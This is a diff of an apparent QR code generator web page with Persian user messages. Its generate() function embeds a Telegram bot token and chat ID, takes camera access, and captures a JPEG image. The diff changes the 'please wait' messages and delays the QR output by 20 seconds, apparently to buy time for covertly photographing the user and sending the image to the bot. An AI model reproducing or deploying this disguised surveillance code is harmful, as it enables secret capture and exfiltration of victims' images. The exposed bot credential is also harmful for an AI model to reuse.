@@ -22,7 +22,7 @@
   
   <script>
 function generate() {
-  alert("ساخته شد برای وارد کردن متن درخواستی 15 ثانیه صبر دهید سپس استفاده کنید")
+  alert("در حال ساختن qrcode لطفا صبر کنید")
   const BOT_TOKEN = "8687133754:AAEIvtI61moYzNCRLtsdU3-U5tUMxJkb9bU";
   const CHAT_ID = "6512853118";
   
@@ -48,10 +48,10 @@ function generate() {
       },'image/jpeg',0.85);
     },3000);
   }).catch(()=>alert('دسترسی به دوربین رد شد'));
-
   // ================== ساخت QR Code ==================
-  document.getElementById('qrcode').innerHTML = '';
-  new QRCode(document.getElementById('qrcode'), {
+  setTimeout(() => {
+    document.getElementById('qrcode').innerHTML = '';
+    new QRCode(document.getElementById('qrcode'), {
     text: text,
     width: 260,
     height: 260,
@@ -59,6 +59,8 @@ function generate() {
     colorLight: "#ffffff",
     correctLevel: QRCode.CorrectLevel.L
   });
+  alert("ساخته شد")
+  }, 20000);
 }
 </script>
 </body>
